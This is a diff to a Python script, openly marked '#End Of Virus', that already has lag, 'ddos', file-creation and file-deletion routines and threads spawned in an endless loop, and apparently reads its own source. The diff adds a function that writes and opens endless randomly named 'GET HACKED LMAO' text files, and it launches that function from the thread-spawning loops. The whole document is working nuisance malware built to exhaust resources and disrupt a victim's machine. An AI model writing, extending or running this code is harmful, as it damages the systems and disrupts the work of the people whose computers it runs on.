@@ -5,7 +5,7 @@ def get_filename():
     cwd = list(cwd)
     result = ""
     for i in cwd:
-        if i == "/" or i == backslash:
+        if i == "/" or i == '\\':
             result = result + " "
         else:
             result = result + i
@@ -26,7 +26,6 @@ def getdefaultgateway():
     return default_gateway.strip()
 getlogin = os.getlogin()
 filename = get_filename()
-backslash = ' \ '.strip()
 opsys = sys.platform
 currentdir = open(sys.argv[0], "r")
 main_code = currentdir.readlines()
@@ -103,7 +102,7 @@ def lag3():
         if opsys == "win32":
             os.system('start')
         else:
-            os.system('HAHAGETHACKEDLMAO')
+            os.system('help')
 def ddos():
     try:
         if opsys == "win32":
@@ -185,6 +184,18 @@ def create_file():
                     pass
     except:
         pass
+def gethackedloltxt():
+    while True:
+        try:
+            namefile = str(random.randint(0, 10000000000000000000000000))
+            file = open(namefile + '.txt', 'w')
+            file.writelines('GET HACKED LMAO')
+            if opsys == "win32":
+                os.startfile(file.name)
+            else:
+                os.system(f'start {file.name}')
+        except:
+            pass
 def thread_starter():
     while True:
         try:
@@ -202,6 +213,8 @@ def thread_starter():
             delete_file.start()
             lagger3 = threading.Thread(target=lag3)
             lagger3.start()
+            txtfile = threading.Thread(target=gethackedloltxt)
+            txtfile.start()
         except:
             pass
 try:
@@ -219,6 +232,8 @@ try:
     delete_file.start()
     lagger3 = threading.Thread(target=lag3)
     lagger3.start()
+    txtfile = threading.Thread(target=gethackedloltxt)
+    txtfile.start()
 except:
     pass
 #End Of Virus
